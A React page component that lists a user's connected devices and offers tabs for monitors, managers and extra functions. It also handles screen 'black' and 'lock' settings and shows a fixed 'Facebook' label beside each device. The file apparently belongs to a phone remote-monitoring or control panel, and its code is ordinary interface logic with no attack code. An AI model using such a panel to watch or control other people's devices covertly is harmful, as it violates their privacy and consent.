import React, { useState, useEffect, useRef } from "react";
import { useTranslation } from "react-i18next";
import toast from "react-hot-toast";

import {
  Container,
  Box,
  Typography,
  SvgIcon,
  List,
  ListItem,
  CircularProgress,
  ToggleButtonGroup,
  ToggleButton,
  Tooltip,
} from "@mui/material";

import { useAuth } from "src/hooks/use-auth";
import { useSocket } from "../../hooks/use-socket";
import { useMediaQuery } from "react-responsive";

import { DeviceManagers } from "../../sections/connectedDevices/managers";
import { DeviceMonitors } from "../../sections/connectedDevices/monitores";
import { DeviceDetails } from "../../sections/connectedDevices/detail";
import { DeviceExtra } from "../../sections/connectedDevices/extra";

import { getDevicesList, getSelectedDeviceInformation } from "../../store/actions/device.action";
import { SocketIOPublicEvents } from "../../sections/settings/setting-socket";
import { useSocketFunctions } from "../../utils/socket";
import Color from "src/theme/colors";

import DevicesOutlinedIcon from "@mui/icons-material/DevicesOutlined";
import SystemSecurityUpdateGoodOutlinedIcon from "@mui/icons-material/SystemSecurityUpdateGoodOutlined";

import { Apps, Collections } from "@mui/icons-material";

export const DeviceContent = () => {
  const { t } = useTranslation();
  const user = useAuth();
  const { socket } = useSocket();
  const isMobile = useMediaQuery({ query: "(max-width: 576px)" });

  const { onSocketCloseMonitor } = useSocketFunctions();

  const [deviceListLoading, setDeviceListLoading] = useState(false);
  const [monitorListLoading, setMonitorListLoading] = useState(false);
  const [addedDevice, setAddedDevice] = useState(false);
  const [devices, setDevices] = useState(null);
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [selectedKey, setSelectedKey] = useState(null);

  const [tabMenuValue, settabMenuValue] = useState(0);
  const toastShownRef = useRef(false);
  const successToast = useRef(false);
  const errorToast = useRef(false);

  useEffect(() => {
    fetchDevices();
  }, [addedDevice]);

  useEffect(() => {
    if (user) {
      fetchDevices();
    }
  }, [user]);

  useEffect(() => {
    socket.on(`${SocketIOPublicEvents.added_device}`, (data) => {
      if (user?.user?._id == data?.userId) {
        if (data.success == true && data.message == "success") {
          setAddedDevice(true);
          if (!successToast.current) {
            // Check if the toast has already been shown
            toast.success(t("toast.success.add-device"), {
              position: "bottom-center",
              reverseOrder: false,
              style: {
                borderRadius: "5px",
                padding: "5px 10px",
                fontSize: "16px",
              },
            });
            successToast.current = true; // Set the toast as shown
          }
        } else if (data.success == false && data.message == "exist") {
          if (!errorToast.current) {
            // Check if the toast has already been shown
            toast.error(t("toast.error.add-device-already"), {
              position: "bottom-center",
              reverseOrder: false,
              duration: 5000,
              style: {
                backgroundColor: Color.background.red_gray01,
                borderRadius: "5px",
                padding: "3px 10px",
              },
            });
            errorToast.current = true; // Set the toast as shown
          }
        } else {
          toast.error(t("toast.error.add-device-error"), {
            position: "bottom-center",
            reverseOrder: false,
            duration: 5000,
            style: {
              backgroundColor: Color.background.red_gray01,
              borderRadius: "5px",
              padding: "3px 10px",
            },
          });
        }
      }
    });
  }, [socket]);

  // Load Devies
  const fetchDevices = async () => {
    setDeviceListLoading(true);
    try {
      const userId = user?.user?._id;
      if (userId) {
        const result = await getDevicesList(userId);

        if (!result || result.length === 0) {
          if (!toastShownRef.current) {
            // Check if the toast has already been shown
            toast.error(t("toast.error.not-found-device"), {
              position: "bottom-center",
              reverseOrder: false,
              duration: 5000,
              style: {
                backgroundColor: Color.background.red_gray01,
                borderRadius: "5px",
                padding: "3px 10px",
              },
            });
            toastShownRef.current = true; // Set the toast as shown
          }
          setDeviceListLoading(false);
          setAddedDevice(false);
        } else {
          setDevices(result);
          setDeviceListLoading(false);
          setAddedDevice(false);
        }
      }
    } catch (error) {
      console.error("Error fetching devices:", error);
    }
  };

  // Get Selected Device Information
  const onSelectDevice = async (device) => {
    setMonitorListLoading(true);
    // Remove localStorage for screen setting
    localStorage.removeItem("black");
    localStorage.removeItem("lock");
    try {
      const device_Id = device?._id;

      // Close current monitor
      if (selectedDevice != null) {
        await onSocketCloseMonitor("monitor-close", {
          deviceId: selectedDevice?.deviceId,
          type: "all",
        });
      }

      // Get Device Information
      const result = await getSelectedDeviceInformation(device_Id);

      if (result && result.length > 0) {
        setSelectedDevice(result[0]);
        setSelectedKey(device_Id);
        setMonitorListLoading(false);
      } else {
        toast.error(t("toast.error.add-device-error"), {
          position: "bottom-center",
          reverseOrder: false,
          duration: 5000,
          style: {
            backgroundColor: Color.background.red_gray01,
            borderRadius: "5px",
            padding: "3px 10px",
          },
        });
        setSelectedDevice(null);
        setSelectedKey(null);
        setMonitorListLoading(false);
      }
    } catch (error) {
      console.log("selected device error", error);
    }
  };

  // Tab Menus
  const onChangeTabMenu = (event, newValue) => {
    settabMenuValue(newValue);
  };

  // Handle device removal
  const handleDeviceRemove = () => {
    fetchDevices();
  };

  return (
    <div
      component="main"
      style={{
        overflow: "hidden",
        flexGrow: 1,
        height: "100%",
        padding: "48px 0",
        position: "relative",
      }}
    >
      <Container maxWidth="xxl">
        <Typography
          variant="body1"
          style={{
            fontFamily: "Teko, sans-serif",
            color: Color.text.primary,
            fontSize: "34px",
          }}
        >
          {t("devicesPage.title")}
        </Typography>
        <Box
          sx={{
            display: "flex",
            flexDirection: { md: "row", xs: "column" },
            gap: "40px",
          }}
        >
          <div style={{ flex: "25%" }}>
            <div style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
              <Box
                sx={{
                  width: "100%",
                  height: { md: "300px", xs: "250px" },
                  backgroundColor: Color.background.main_gray01,
                  border: `solid 1px ${Color.background.border}`,
                  borderRadius: "5px",
                  p: 2,
                }}
              >
                <Box
                  sx={{
                    display: "flex",
                    alignItems: "center",
                    gap: "5px",
                    borderBottom: `solid 2px ${Color.background.border}`,
                    pb: "5px",
                  }}
                >
                  <Typography
                    sx={{
                      display: "flex",
                      alignItems: "center",
                      color: Color.text.primary,
                      fontSize: "24px",
                      fontFamily: "Bebas Neue, sans-serif",
                    }}
                  >
                    {t("devicesPage.devices")}
                  </Typography>
                </Box>

                <List sx={{ height: "80%", overflowY: "auto" }}>
                  {deviceListLoading ? (
                    <div
                      style={{
                        position: "absolute",
                        top: 50,
                        left: 0,
                        right: 0,
                        bottom: 0,
                        display: "flex",
                        flexDirection: "column",
                        justifyContent: "center",
                        alignItems: "center",
                        zIndex: 1,
                        width: "100%",
                      }}
                    >
                      <div
                        style={{
                          display: "flex",
                          justifyContent: "center",
                          alignItems: "center",
                          backgroundColor: Color.background.purple,
                          width: "30px",
                          height: "30px",
                          borderRadius: "5px",
                        }}
                      >
                        <CircularProgress sx={{ color: Color.text.primary }} size={20} />
                      </div>
                    </div>
                  ) : devices != null ? (
                    devices &&
                    devices.map((device, index) => (
                      <Box
                        key={index}
                        sx={{
                          width: "fit-content",
                          display: "flex",
                          justifyContent: "space-between",
                          alignItems: "center",
                          cursor: "pointer",
                          py: "10px",
                          px: "5px",
                          borderRight: "5px",
                          color: Color.text.primary,
                          border: `solid 1px ${Color.background.border}`,
                          mb: "5px",
                          "&:hover": {
                            bgcolor: Color.background.purple_opacity,
                            border: `solid 1px ${Color.background.purple}`,
                          },
                          bgcolor:
                            selectedKey === device?._id
                              ? Color.background.purple_opacity
                              : "inherit",
                        }}
                        onClick={() => onSelectDevice(device)}
                      >
                        <Box
                          sx={{
                            display: "flex",
                            alignItems: "center",
                            gap: "10px",
                          }}
                        >
                          <SvgIcon sx={{ color: Color.text.primary }}>
                            <SystemSecurityUpdateGoodOutlinedIcon />
                          </SvgIcon>
                          <Box sx={{ display: "flex", flexDirection: "row", gap: "10px" }}>
                            <Typography
                              sx={{
                                fontSize: { xl: "14px", lg: "12px" },
                                fontWeight: { xl: 300, lg: 200 },
                                color: Color.text.primary,
                                width: "80px",
                                overflow: "hidden",
                                textOverflow: "ellipsis",
                                whiteSpace: "nowrap",
                              }}
                            >
                              {device?.manufacturer}
                            </Typography>

                            <Typography
                              sx={{
                                fontSize: "14px",
                                fontWeight: 300,
                                width: "80px",
                                overflow: "hidden",
                                textOverflow: "ellipsis",
                                whiteSpace: "nowrap",
                              }}
                            >
                              {device?.models}
                            </Typography>

                            <Typography
                              sx={{
                                fontSize: "14px",
                                fontWeight: 300,
                                width: "50px",
                                overflow: "hidden",
                                textOverflow: "ellipsis",
                                whiteSpace: "nowrap",
                              }}
                            >
                              {`v ${device?.version}`}
                            </Typography>

                            <Typography
                              sx={{
                                fontSize: "14px",
                                fontWeight: 300,
                                overflow: "hidden",
                                width: "80px",
                                textOverflow: "ellipsis",
                                whiteSpace: "nowrap",
                              }}
                            >
                              {"Facebook"}
                            </Typography>
                          </Box>
                        </Box>
                      </Box>
                    ))
                  ) : (
                    <Typography
                      sx={{
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        gap: "15px",
                        p: 1,
                        color: "#f1f1f1",
                        fontSize: "14px",
                        fontWeight: 100,
                      }}
                    >
                      {t("devicesPage.noDevice")}
                    </Typography>
                  )}
                </List>
              </Box>

              {/* Device Information */}
              <Box
                sx={{
                  display: { md: "block", xs: "none" },
                  width: "100%",
                  backgroundColor: Color.background.main_gray01,
                  border: `solid 1px ${Color.background.border}`,
                  borderRadius: "5px",
                  py: 3,
                  px: 2,
                }}
              >
                <DeviceDetails
                  selectedDevice={selectedDevice != null && selectedDevice}
                  onDeviceRemoved={handleDeviceRemove}
                />
              </Box>
            </div>
          </div>
          <div style={{ flex: "75%" }}>
            <div
              style={{
                height: "100%",
                width: "100%",
                padding: "16px",
                borderRadius: "5px",
                backgroundColor: Color.background.main_gray01,
                border: `solid 1px ${Color.background.border}`,
              }}
            >
              <Box
                sx={{
                  width: "100%",
                  display: "flex",
                  flexDirection: "column",
                  gap: "30px",
                  minHeight: "600px",
                }}
              >
                {monitorListLoading ? (
                  <div
                    style={{
                      position: "absolute",
                      top: 0,
                      left: 0,
                      right: 0,
                      bottom: 0,
                      display: "flex",
                      flexDirection: "column",
                      justifyContent: "center",
                      alignItems: "center",
                      zIndex: 1,
                      width: "100%",
                      backgroundColor: Color.background.main_gray01,
                    }}
                  >
                    <CircularProgress sx={{ color: Color.background.purple }} size={40} />
                  </div>
                ) : (
                  selectedDevice &&
                  Object.keys(selectedDevice).length > 0 && (
                    <Box sx={{ width: "100%" }}>
                      <Box
                        sx={{
                          display: "flex",
                          justifyContent: "center",
                          borderBottom: `solid 2px ${Color.background.border}`,
                          pb: "10px",
                        }}
                      >
                        <ToggleButtonGroup
                          value={tabMenuValue}
                          exclusive
                          onChange={onChangeTabMenu}
                          sx={{
                            backgroundColor: Color.background.purple_opacity,
                            borderRadius: "50px",
                          }}
                        >
                          <Tooltip title={t("devicesPage.monitors.monitors")} arrow>
                            <ToggleButton
                              className="monitor-toogle-menu"
                              value={0}
                              selected={tabMenuValue === 0}
                              sx={{
                                gap: 1,
                                padding: "10px 20px",
                              }}
                            >
                              <DevicesOutlinedIcon />{" "}
                              {!isMobile && t("devicesPage.monitors.monitors")}
                            </ToggleButton>
                          </Tooltip>

                          <Tooltip title={t("devicesPage.managers.managers")} arrow>
                            <ToggleButton
                              className="monitor-toogle-menu"
                              value={1}
                              selected={tabMenuValue === 1}
                              sx={{
                                gap: 1,
                                padding: "10px 20px",
                              }}
                            >
                              <Collections /> {!isMobile && t("devicesPage.managers.managers")}
                            </ToggleButton>
                          </Tooltip>

                          <Tooltip title={t("devicesPage.extraFunctions.extraFunction")} arrow>
                            <ToggleButton
                              className="monitor-toogle-menu"
                              value={2}
                              selected={tabMenuValue === 2}
                              sx={{
                                gap: 1,
                                padding: "10px 20px",
                              }}
                            >
                              <Apps /> {!isMobile && t("devicesPage.extraFunctions.extraFunction")}
                            </ToggleButton>
                          </Tooltip>
                        </ToggleButtonGroup>
                      </Box>
                      <Box sx={{ p: 1, px: 0 }}>
                        {tabMenuValue === 0 && (
                          <Box
                            sx={{
                              display: "flex",
                              flexDirection: "column",
                              mt: 2,
                              height: "500px",
                              maxHeight: "500px",
                            }}
                          >
                            {selectedDevice != null && <DeviceMonitors device={selectedDevice} />}
                          </Box>
                        )}

                        {tabMenuValue === 1 && (
                          <Box
                            sx={{
                              display: "flex",
                              flexDirection: "column",
                              mt: 2,
                              height: "500px",
                              maxHeight: "500px",
                            }}
                          >
                            {selectedDevice != null && <DeviceManagers device={selectedDevice} />}
                          </Box>
                        )}

                        {tabMenuValue === 2 && (
                          <Box sx={{ display: "flex", flexDirection: "column", mt: 2 }}>
                            {selectedDevice != null && <DeviceExtra device={selectedDevice} />}
                          </Box>
                        )}
                      </Box>
                    </Box>
                  )
                )}
              </Box>
            </div>
          </div>
        </Box>
      </Container>
    </div>
  );
};
